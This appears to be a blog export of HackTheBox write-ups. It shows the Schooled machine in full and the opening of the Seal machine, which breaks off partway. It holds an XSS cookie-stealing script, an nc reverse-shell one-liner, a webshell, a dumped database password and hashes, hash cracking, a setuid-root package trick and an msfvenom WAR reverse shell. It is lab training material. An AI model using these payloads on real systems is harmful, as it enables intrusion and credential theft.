Let\u0026rsquo;s find the version of moodle We can also visit http://moodle.schooled.htb/moodle/theme/upgrade.txt Possible version: 3.9 - 3.10 └─$ droopescan scan moodle -u http://moodle.schooled.htb/moodle [+] Plugins found: forum http://moodle.schooled.htb/moodle/mod/forum/ http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt http://moodle.schooled.htb/moodle/mod/forum/version.php [+] No themes found. [+] Possible version(s): 3.10.0-beta [+] Possible interesting urls found: Static readme file. - http://moodle.schooled.htb/moodle/README.txt Admin panel - http://moodle.schooled.htb/moodle/login/ [+] Scan finished (0:00:14.924275 elapsed) Considering the fact that someone will be checking the account and the note suggesting MoodleNet profile to be set Googling results in CVE-2020-25627 I\u0026rsquo;ll edit my profile and add XSS payload to MoodleNet profile field \u0026lt;script src=\u0026quot;http://10.10.16.4/test.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; And I receive back connection └─$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.16.4 - - [06/Nov/2023 09:52:04] code 404, message File not found 10.10.16.4 - - [06/Nov/2023 09:52:04] \u0026#34;GET /test.js HTTP/1.1\u0026#34; 404 - 10.10.16.4 - - [06/Nov/2023 09:52:04] code 404, message File not found 10.10.16.4 - - [06/Nov/2023 09:52:04] \u0026#34;GET /test.js HTTP/1.1\u0026#34; 404 - I\u0026rsquo;ll create a test.js to steal a cookie var xhr=new XMLHttpRequest(); xhr.open(\u0026#34;GET\u0026#34;, \u0026#34;http://10.10.16.4/?cookie=\u0026#34;+document.cookie, true); xhr.send(); After few seconds we will receive a cookie 10.10.10.234 - - [06/Nov/2023 10:10:10] \u0026#34;GET /test.js HTTP/1.1\u0026#34; 200 - 10.10.10.234 - - [06/Nov/2023 10:10:10] \u0026#34;GET /?cookie=MoodleSession=p08voph7l22d8bshlqiatanfmo HTTP/1.1\u0026#34; 200 - Set the cookie and refresh the page Now having the teacher role, we could perform privilege escalation Based on security posts https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/moodle#rce Check video for detailed steps We need to know a manager user, which Lianne Carter based on web page Now we have our target, we can start performing the attack We have to enrol users Select Maths course and navigate to Participants and then click Enrol Users Search for Lianne Carter Before clicking Enrol Users, we have turn on Burp Intercept We have to change userlist to Manuel\u0026rsquo;s id and roletoassign to 1 (manager role) Manuel\u0026rsquo;s id is 24 Forward request And we see that Manuel is manager and teacher We also have to add Liana to our class Now as Lianne we can access Site Administration There we have to select Users and Define Roles Now click gear icon on manager Without changing anything, turn on Burp intercept and click Save Changes In Burp using the payload from PoC Leave sesskey as it is, but replace the rest of the paremeters with the payload Forward the request Now we have plugins menu Now we can upload the zip from PoC\nClick Install Plugins and drop zip there Now we have our webshell\n└─$ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id uid=80(www) gid=80(www) groups=80(www) Get reverse shell └─$ curl -G http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php --data-urlencode \u0026#39;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.4 6666 \u0026gt;/tmp/f\u0026#39; User Let\u0026rsquo;s enumerate moodle directory has config.php with creds to db [www@Schooled /usr/local/www/apache24/data/moodle]$ cat config.php \u0026lt;?php // Moodle configuration file unset($CFG); global $CFG; $CFG = new stdClass(); $CFG-\u0026gt;dbtype = \u0026#39;mysqli\u0026#39;; $CFG-\u0026gt;dblibrary = \u0026#39;native\u0026#39;; $CFG-\u0026gt;dbhost = \u0026#39;localhost\u0026#39;; $CFG-\u0026gt;dbname = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbuser = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbpass = \u0026#39;PlaybookMaster2020\u0026#39;; $CFG-\u0026gt;prefix = \u0026#39;mdl_\u0026#39;; $CFG-\u0026gt;dboptions = array ( \u0026#39;dbpersist\u0026#39; =\u0026gt; 0, \u0026#39;dbport\u0026#39; =\u0026gt; 3306, \u0026#39;dbsocket\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;dbcollation\u0026#39; =\u0026gt; \u0026#39;utf8_unicode_ci\u0026#39;, ); $CFG-\u0026gt;wwwroot = \u0026#39;http://moodle.schooled.htb/moodle\u0026#39;; $CFG-\u0026gt;dataroot = \u0026#39;/usr/local/www/apache24/moodledata\u0026#39;; $CFG-\u0026gt;admin = \u0026#39;admin\u0026#39;; $CFG-\u0026gt;directorypermissions = 0777; require_once(__DIR__ . \u0026#39;/lib/setup.php\u0026#39;); // There is no php closing tag in this file, // it is intentional because it prevents trailing whitespace problems! Enumerate db [www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 moodle mysql: [Warning] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 1754 Server version: 8.0.23 Source distribution Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. moodle@localhost [moodle]\u0026gt; moodle@localhost [moodle]\u0026gt; select username, email, password from mdl_user; +-------------------+----------------------------------------+--------------------------------------------------------------+ | username | email | password | +-------------------+----------------------------------------+--------------------------------------------------------------+ | guest | root@localhost | $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 | | admin | jamie@staff.schooled.htb | $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW | | bell_oliver89 | bell_oliver89@student.schooled.htb | $2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK | | orchid_sheila89 | orchid_sheila89@student.schooled.htb | $2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC | | chard_ellzabeth89 | chard_elizabeth89@student.schooled.htb | $2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC | | morris_jake89 | morris_jake89@student.schooled.htb | $2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy | | heel_james89 | heel_james89@student.schooled.htb | $2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim | | nash_michael89 | nash_michael89@student.schooled.htb | $2y$10$yShrS/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu | | singh_rakesh89 | singh_rakesh89@student.schooled.htb | $2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu | | taint_marcus89 | taint_marcus89@student.schooled.htb | $2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa | | walls_shaun89 | walls_shaun89@student.schooled.htb | $2y$10$EDXwQZ9Dp6UNHjAF.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga | | smith_john89 | smith_john89@student.schooled.htb | $2y$10$YRdwHxfstP0on0Yzd2jkNe/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em | | white_jack89 | white_jack89@student.schooled.htb | $2y$10$PRy8LErZpSKT7YuSxlWntOWK/5LmSEPYLafDd13Nv36MxlT5yOZqK | | travis_carl89 | travis_carl89@student.schooled.htb | $2y$10$VO/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S | | mac_amy89 | mac_amy89@student.schooled.htb | $2y$10$PgOU/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i | | james_boris89 | james_boris89@student.schooled.htb | $2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq | | pierce_allan | pierce_allan89@student.schooled.htb | $2y$10$ia9fKz9.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy | | henry_william89 | henry_william89@student.schooled.htb | $2y$10$qj67d57dL/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu | | harper_zoe89 | harper_zoe89@student.schooled.htb | $2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy | | wright_travis89 | wright_travis89@student.schooled.htb | $2y$10$XFE/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm | | allen_matthew89 | allen_matthew89@student.schooled.htb | $2y$10$kFYnbkwG.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq | | sanders_wallis89 | sanders_wallis89@student.schooled.htb | $2y$10$br9VzK6V17zJttyB8jK9Tub/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u | | higgins_jane | higgins_jane@staff.schooled.htb | $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2 | | phillips_manuel | phillips_manuel@staff.schooled.htb | $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG | | carter_lianne | carter_lianne@staff.schooled.htb | $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe | | parker_dan89 | parker_dan89@student.schooled.htb | $2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi | | parker_tim89 | parker_tim89@student.schooled.htb | $2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S | | pentest | pentest@student.schooled.htb | $2y$10$9apb0.ySzPSF785.qf9tYe0T0DqObsKZ0d0ly3mjrJb/o5ZEnZDMi | +-------------------+----------------------------------------+--------------------------------------------------------------+ 28 rows in set (0.00 sec) Admin user has jamie\u0026rsquo;s email So we probably have to target his hash └─$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting \u0026lt;SNIP\u0026gt; $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx \u0026lt;SNIP\u0026gt; Now we can ssh as jamie └─$ sshpass -p \u0026#39;!QAZ2wsx\u0026#39; ssh jamie@10.10.10.234 Warning: Permanently added \u0026#39;10.10.10.234\u0026#39; (ED25519) to the list of known hosts. Last login: Fri Oct 29 12:35:59 2021 from 10.10.14.23 FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021 Welcome to FreeBSD! Release Notes, Errata: https://www.FreeBSD.org/releases/ Security Advisories: https://www.FreeBSD.org/security/ FreeBSD Handbook: https://www.FreeBSD.org/handbook/ FreeBSD FAQ: https://www.FreeBSD.org/faq/ Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/ FreeBSD Forums: https://forums.FreeBSD.org/ Documents installed with the system are in the /usr/local/share/doc/freebsd/ directory, or can be installed later with: pkg install en-freebsd-doc For other languages, replace \u0026#34;en\u0026#34; with a language code like de or fr. Show the version of FreeBSD installed: freebsd-version ; uname -a Please include that output and any error messages when posting questions. Introduction to manual pages: man man FreeBSD directory layout: man hier To change this login announcement, see motd(5). When you\u0026#39;ve made modifications to a file in vi(1) and then find that you can\u0026#39;t write it, type ``\u0026lt;ESC\u0026gt;!rm -f %\u0026#39;\u0026#39; then ``:w!\u0026#39;\u0026#39; to force the write This won\u0026#39;t work if you don\u0026#39;t have write permissions to the directory and probably won\u0026#39;t be suitable if you\u0026#39;re editing through a symbolic link. If you have sudo(8) installed and permissions to use it, type ``\u0026lt;ESC\u0026gt;w ! sudo tee %\u0026#39;\u0026#39; to force a write. jamie@Schooled:~ $ Root sudo jamie@Schooled:~ $ sudo -l User jamie may run the following commands on Schooled: (ALL) NOPASSWD: /usr/sbin/pkg update (ALL) NOPASSWD: /usr/sbin/pkg install * GTFOBins Install fpm sudo gem i fpm -f Then perform the steps from the link I\u0026rsquo;ll create x.sh script cp /bin/bash /tmp/pwn chmod 4777 /tmp/pwn └─$ TF=$(mktemp -d) └─$ cp x.sh $TF/x.sh └─$ fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF Created package {:path=\u0026gt;\u0026#34;x-1.0.txz\u0026#34;} Upload package to box jamie@Schooled:/tmp $ curl 10.10.16.4/x-1.0.txz -o x-1.0.txz % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 508 100 508 0 0 720 0 --:--:-- --:--:-- --:--:-- 719 jamie@Schooled:/tmp $ sudo pkg install -y --no-repo-update ./x-1.0.txz pkg: Repository FreeBSD has a wrong packagesite, need to re-create database pkg: Repository FreeBSD cannot be opened. \u0026#39;pkg update\u0026#39; required Checking integrity... done (0 conflicting) The following 1 package(s) will be affected (of 0 checked): New packages to be INSTALLED: x: 1.0 Number of packages to be installed: 1 [1/1] Installing x-1.0... Extracting x-1.0: 100% We are root Extracting x-1.0: 100% jamie@Schooled:/tmp $ ls f mysql.sock mysql.sock.lock mysqlx.sock mysqlx.sock.lock pwn tmp.8zPmGCV9WK x-1.0.txz jamie@Schooled:/tmp $ ./pwn -p [jamie@Schooled /tmp]# whoami root [jamie@Schooled /tmp]# ","date":"November 2, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/schooled/images/schooled.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/schooled/","summary":"Schooled Enumeration nmap └─$ nmap -Pn -p- 10.10.10.234 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 06:55 GMT Warning: 10.10.10.234 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.234 (10.10.10.234) Host is up (0.17s latency). Not shown: 59976 closed tcp ports (conn-refused), 5556 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 33060/tcp open mysqlx Nmap done: 1 IP address (1 host up) scanned in 399.","tags":["HTB","moodle","wfuzz","vhosts","cve-2020-25627","cve-2020-14321","moodle-plugin","webshell","password-reuse","credentials","hashcat","pkg","freebsd","package"],"title":"[HTB] Machine: Schooled"},{"categories":null,"contents":"Seal Enumeration nmap └─$ nmap -Pn -p- 10.10.10.250 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 14:34 GMT Warning: 10.10.10.250 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.250 (10.10.10.250) Host is up (0.21s latency). Not shown: 63375 closed tcp ports (conn-refused), 2157 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 443/tcp open https 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 148.11 seconds └─$ nmap -Pn -p22,443,8080 -sC -sV 10.10.10.250 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 14:37 GMT Nmap scan report for 10.10.10.250 (10.10.10.250) Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA) | 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA) |_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-title: Seal Market | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | tls-nextprotoneg: |_ http/1.1 | ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK | Not valid before: 2021-05-05T10:24:03 |_Not valid after: 2022-05-05T10:24:03 |_http-server-header: nginx/1.18.0 (Ubuntu) 8080/tcp open http-proxy | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. |_http-title: Site doesn\u0026#39;t have a title (text/html;charset=utf-8). | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 401 Unauthorized | Date: Sun, 05 Nov 2023 14:37:06 GMT | Set-Cookie: JSESSIONID=node01prvvo51qscyy1975l0bkow4cs2.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 | GetRequest: | HTTP/1.1 401 Unauthorized | Date: Sun, 05 Nov 2023 14:37:03 GMT | Set-Cookie: JSESSIONID=node0gnhde3itepwijm5ouse0ca1b0.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 | HTTPOptions: | HTTP/1.1 200 OK | Date: Sun, 05 Nov 2023 14:37:04 GMT | Set-Cookie: JSESSIONID=node0157tuo2326c40miepxt8u3qz51.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Allow: GET,HEAD,POST,OPTIONS | Content-Length: 0 | RPCCheck: | HTTP/1.1 400 Illegal character OTEXT=0x80 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 71 | Connection: close | \u0026lt;h1\u0026gt;Bad Message 400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason: Illegal character OTEXT=0x80\u0026lt;/pre\u0026gt; | RTSPRequest: | HTTP/1.1 505 Unknown Version | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 58 | Connection: close | \u0026lt;h1\u0026gt;Bad Message 505\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason: Unknown Version\u0026lt;/pre\u0026gt; | Socks4: | HTTP/1.1 400 Illegal character CNTL=0x4 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 69 | Connection: close | \u0026lt;h1\u0026gt;Bad Message 400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason: Illegal character CNTL=0x4\u0026lt;/pre\u0026gt; | Socks5: | HTTP/1.1 400 Illegal character CNTL=0x5 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 69 | Connection: close |_ \u0026lt;h1\u0026gt;Bad Message 400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason: Illegal character CNTL=0x5\u0026lt;/pre\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.94%I=7%D=11/5%Time=6547A8C3%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,F3,\u0026#34;HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDate:\\x20Sun,\\x2005\\x2 SF:0Nov\\x202023\\x2014:37:03\\x20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node0gnhde SF:3itepwijm5ouse0ca1b0\\.node0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu, SF:\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html; SF:charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(HTTPOptions,108,\u0026#34;HTTP SF:/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Sun,\\x2005\\x20Nov\\x202023\\x2014:37:04\\x2 SF:0GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node0157tuo2326c40miepxt8u3qz51\\.node SF:0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x200 SF:0:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nAllow:\\x2 SF:0GET,HEAD,POST,OPTIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest, SF:AD,\u0026#34;HTTP/1\\.1\\x20505\\x20Unknown\\x20Version\\r\\nContent-Type:\\x20text/htm SF:l;charset=iso-8859-1\\r\\nContent-Length:\\x2058\\r\\nConnection:\\x20close\\r SF:\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Message\\x20505\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason:\\x20Unknown\\x20Version\u0026lt; SF:/pre\u0026gt;\u0026#34;)%r(FourOhFourRequest,F5,\u0026#34;HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDat SF:e:\\x20Sun,\\x2005\\x20Nov\\x202023\\x2014:37:06\\x20GMT\\r\\nSet-Cookie:\\x20JS SF:ESSIONID=node01prvvo51qscyy1975l0bkow4cs2\\.node0;\\x20Path=/;\\x20HttpOnl SF:y\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nConten SF:t-Type:\\x20text/html;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r( SF:Socks5,C3,\u0026#34;HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20CNTL=0x5\\r\\nCont SF:ent-Type:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nC SF:onnection:\\x20close\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Message\\x20400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason:\\x SF:20Illegal\\x20character\\x20CNTL=0x5\u0026lt;/pre\u0026gt;\u0026#34;)%r(Socks4,C3,\u0026#34;HTTP/1\\.1\\x2040 SF:0\\x20Illegal\\x20character\\x20CNTL=0x4\\r\\nContent-Type:\\x20text/html;cha SF:rset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\ SF:n\u0026lt;h1\u0026gt;Bad\\x20Message\\x20400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason:\\x20Illegal\\x20character\\x20 SF:CNTL=0x4\u0026lt;/pre\u0026gt;\u0026#34;)%r(RPCCheck,C7,\u0026#34;HTTP/1\\.1\\x20400\\x20Illegal\\x20characte SF:r\\x20OTEXT=0x80\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nCon SF:tent-Length:\\x2071\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Message\\x2 SF:0400\u0026lt;/h1\u0026gt;\u0026lt;pre\u0026gt;reason:\\x20Illegal\\x20character\\x20OTEXT=0x80\u0026lt;/pre\u0026gt;\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.82 seconds Web Server vhosts └─$ wfuzz -u https://10.10.10.250/ -H \u0026#39;Host: FUZZ.seal.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 1140 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: https://10.10.10.250/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000689: 400 16 L 122 W 2250 Ch \u0026#34;gc._msdcs\u0026#34; 000009532: 400 14 L 100 W 1949 Ch \u0026#34;#www\u0026#34; 000010581: 400 14 L 100 W 1949 Ch \u0026#34;#mail\u0026#34; gobuster /manager indicates tomcat └─$ gobuster dir -u https://seal.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php -t 50 --no-error -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://seal.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 19737] /images (Status: 302) [Size: 0] [--\u0026gt; http://seal.htb/images/] /admin (Status: 302) [Size: 0] [--\u0026gt; http://seal.htb/admin/] /icon (Status: 302) [Size: 0] [--\u0026gt; http://seal.htb/icon/] /css (Status: 302) [Size: 0] [--\u0026gt; http://seal.htb/css/] /js (Status: 302) [Size: 0] [--\u0026gt; http://seal.htb/js/] /manager (Status: 302) [Size: 0] [--\u0026gt; http://seal.htb/manager/] Port 8080 Register a user and enumerate Foothold Inside seal_market repo we have a tomcat folder with configs But none of them reveals anything Yet we have history of commits Found creds tomcat:42MrHBf*z8{Z% But we can\u0026rsquo;t access /manager due to nginx mutual authentication check configurations \u0026lt;SNIP\u0026gt; location /manager/html { if ($ssl_client_verify != SUCCESS) { return 403; } proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://localhost:8000; proxy_read_timeout 90; proxy_redirect http://localhost:8000 https://0.0.0.0; # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. #\ttry_files $uri $uri/ =404; } location /admin/dashboard { if ($ssl_client_verify != SUCCESS) { return 403; } proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://localhost:8000; proxy_read_timeout 90; proxy_redirect http://localhost:8000 https://0.0.0.0; # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. #\ttry_files $uri $uri/ =404; } location /host-manager/html { if ($ssl_client_verify != SUCCESS) { return 403; } proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_pass http://localhost:8000; proxy_read_timeout 90; proxy_redirect http://localhost:8000 https://0.0.0.0; # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. # try_files $uri $uri/ =404; } \u0026lt;SNIP\u0026gt; If we google for NGINX and Tomcat misconfigurations, we will eventually hit a post which discusses the possible attack path https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/ So Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is So if we send visit https://seal.htb/manager..;/html, then nginx will interpret it as it is and redirect it to tomcat tomcat will normalize it and interpret it as https://seal.htb/manager/html But the post has different variations, the one that worked for me was https://seal.htb/manager/test/..;/html Let\u0026rsquo;s create war file └─$ msfvenom -p java/shell_reverse_tcp lhost=10.10.16.4 lport=6666 -f war -o rev.war Payload size: 13302 bytes Final size of war file: 13302 bytes Saved as: rev.war Select war file in Deploy section and click deploy You might receive 403, so we have to intercept the request and change a path Modify path after clicking deploy And we see our application Visit our malicious application and receive reverse shell User We have a user luis tomcat@seal:/var/lib/tomcat9$ ls -lha /home/luis/ total 51M drwxr-xr-x 9 luis luis 4.0K May 7 2021 . drwxr-xr-x 3 root root 4.0K May 5 2021 .. drwxrwxr-x 3 luis luis 4.0K May 7 2021 .ansible lrwxrwxrwx 1 luis luis 9 May 5 2021 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 luis luis 220 May 5 2021 .bash_logout -rw-r--r-- 1 luis luis 3.8K May 5 2021 .bashrc drwxr-xr-x 3 luis luis 4.0K May 7 2021 .cache drwxrwxr-x 3 luis luis 4.0K May 5 2021 .config drwxrwxr-x 6 luis luis 4.0K Nov 5 14:24 .gitbucket -rw-r--r-- 1 luis luis 51M Jan 14 2021 gitbucket.war drwxrwxr-x 3 luis luis 4.0K May 5 2021 .java drwxrwxr-x 3 luis luis 4.0K May 5 2021 .local -rw-r--r-- 1 luis luis 807 May 5 2021 .profile drwx------ 2 luis luis 4.0K May 7 2021 .ssh -r-------- 1 luis luis 33 Nov 5 14:24 user.txt We have a non-empty /opt Looks like ansible-playbooks which are owned by luis tomcat@seal:/var/lib/tomcat9$ ls /opt/backups/ archives playbook tomcat@seal:/var/lib/tomcat9$ ls -lha /opt/backups/ total 16K drwxr-xr-x 4 luis luis 4.0K Nov 5 16:02 . drwxr-xr-x 3 root root 4.0K May 7 2021 .. drwxrwxr-x 2 luis luis 4.0K Nov 5 16:02 archives drwxrwxr-x 2 luis luis 4.0K May 7 2021 playbook It copies files from /var/lib/tomcat9/webapps/ROOT/admin/dashboard to /opt/backups/files with copy_links=yes Then it archives them Then it deletes /opt/backups/files tomcat@seal:/var/lib/tomcat9$ ls -lha /opt/backups/playbook/ total 12K drwxrwxr-x 2 luis luis 4.0K May 7 2021 . drwxr-xr-x 4 luis luis 4.0K Nov 5 16:06 .. -rw-rw-r-- 1 luis luis 403 May 7 2021 run.yml tomcat@seal:/var/lib/tomcat9$ cat /opt/backups/playbook/run.yml - hosts: localhost tasks: - name: Copy Files synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes - name: Server Backups archive: path: /opt/backups/files/ dest: \u0026#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz\u0026#34; - name: Clean file: state: absent path: /opt/backups/files/ Looks like it\u0026rsquo;s running every minute 